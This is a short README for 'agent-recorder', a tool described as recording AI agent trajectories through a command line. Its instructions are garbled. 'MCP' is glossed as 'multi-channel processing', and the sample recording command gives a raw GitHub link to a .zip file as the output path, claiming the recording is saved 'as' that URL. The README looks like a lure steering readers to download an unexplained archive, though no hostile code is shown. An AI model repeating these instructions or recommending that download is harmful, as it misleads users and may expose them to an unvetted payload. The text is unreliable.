## 📖 What is agent-recorder?

agent-recorder helps you record movement data and actions in a simple way. It stores paths and actions (called trajectories) used by Code Agent frameworks. These frameworks help computers learn from data. agent-recorder works with standard tools using a common method, so you don’t have to worry about technical details.

It offers both a command line interface (CLI) and support for multi-channel processing (MCP). Simply put, you can run it using commands or connect it with other tools easily.

This software is useful if you want to collect data from an AI agent running in your environment, study it later, or use it for experiments.

## 🚀 How to Run agent-recorder

After installation, you can start the program. Here is a simple way to run it using the command line interface (CLI).

### Open the Command Prompt or Terminal

- On Windows, press `Windows key + R`, type `cmd`, then Enter.
- On macOS, open `Terminal` from Applications > Utilities.
- On Linux, open your default terminal emulator.

### Run agent-recorder

Navigate to the folder where you installed or extracted the software. Use the `cd` command to change directories. For example:

```bash
cd C:\Users\YourName\Downloads\agent-recorder
```

(or the path where you put the files)

Next, type the command below and press Enter:

```bash
agent-recorder --help
```

This will show the available options and commands you can run.

### Basic command to start recording

You can start recording a trajectory by running:

```bash
agent-recorder record --output https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip
```

This command starts the recording and saves it as `https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip`. You will see live updates on the terminal while it runs.

To stop recording, press `Ctrl+C`.
